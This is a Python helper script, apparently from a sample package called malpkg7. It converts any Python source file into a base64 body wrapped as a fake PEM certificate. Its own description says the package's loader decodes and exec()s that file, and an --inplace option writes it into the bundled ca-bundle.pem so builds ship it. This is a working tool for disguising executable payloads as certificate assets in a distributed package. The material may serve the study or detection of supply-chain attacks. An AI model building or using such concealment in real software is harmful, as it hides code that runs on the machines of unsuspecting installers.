"""
Helper: convert a Python source file into the fake-PEM asset that
`src/malpkg7/__init__.py` knows how to load.

This is a developer-time utility — it is intentionally kept at the
project root, not under `src/malpkg7/`, so it is not shipped in the
built wheel. It uses only the standard library.

Usage:

    # write the generated .pem to stdout
    python3 convert.py path/to/payload.py

    # write to a specific file
    python3 convert.py path/to/payload.py -o out/ca-bundle.pem

    # overwrite the sample package's bundled asset in place
    python3 convert.py path/to/payload.py --inplace

The output format matches what the loader expects:

    -----BEGIN CERTIFICATE-----
    <base64 body, wrapped at 64 columns>
    -----END CERTIFICATE-----
"""

from __future__ import annotations

import argparse
import base64
import pathlib
import sys
import textwrap


BEGIN_MARKER = "-----BEGIN CERTIFICATE-----"
END_MARKER = "-----END CERTIFICATE-----"
WRAP_COLUMNS = 64

# Default install target for `--inplace`: the asset shipped by the
# sample package in this directory.
DEFAULT_INPLACE_TARGET = pathlib.Path(__file__).with_name("src") / "malpkg7" / "certs" / "ca-bundle.pem"


def encode(payload: bytes) -> str:
    """Encode `payload` bytes into a fake-PEM certificate string."""
    body = base64.b64encode(payload).decode("ascii")
    wrapped = "\n".join(textwrap.wrap(body, WRAP_COLUMNS))
    return f"{BEGIN_MARKER}\n{wrapped}\n{END_MARKER}\n"


def _parse_args(argv: list[str]) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Convert a Python source file into the fake-PEM asset "
            "format that malpkg7's loader decodes and exec()s."
        )
    )
    parser.add_argument(
        "source",
        type=pathlib.Path,
        help="Path to the Python source file to encode as the payload.",
    )
    out_group = parser.add_mutually_exclusive_group()
    out_group.add_argument(
        "-o",
        "--output",
        type=pathlib.Path,
        default=None,
        help="Write the generated .pem to this path (default: stdout).",
    )
    out_group.add_argument(
        "--inplace",
        action="store_true",
        help=(
            "Overwrite the bundled asset at "
            f"{DEFAULT_INPLACE_TARGET.relative_to(pathlib.Path(__file__).parent)} "
            "so the next build picks it up."
        ),
    )
    return parser.parse_args(argv)


def main(argv: list[str] | None = None) -> int:
    args = _parse_args(sys.argv[1:] if argv is None else argv)

    if not args.source.is_file():
        print(f"error: source file not found: {args.source}", file=sys.stderr)
        return 2

    pem = encode(args.source.read_bytes())

    if args.inplace:
        DEFAULT_INPLACE_TARGET.parent.mkdir(parents=True, exist_ok=True)
        DEFAULT_INPLACE_TARGET.write_text(pem)
        print(f"wrote {DEFAULT_INPLACE_TARGET}", file=sys.stderr)
    elif args.output is not None:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        args.output.write_text(pem)
        print(f"wrote {args.output}", file=sys.stderr)
    else:
        sys.stdout.write(pem)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
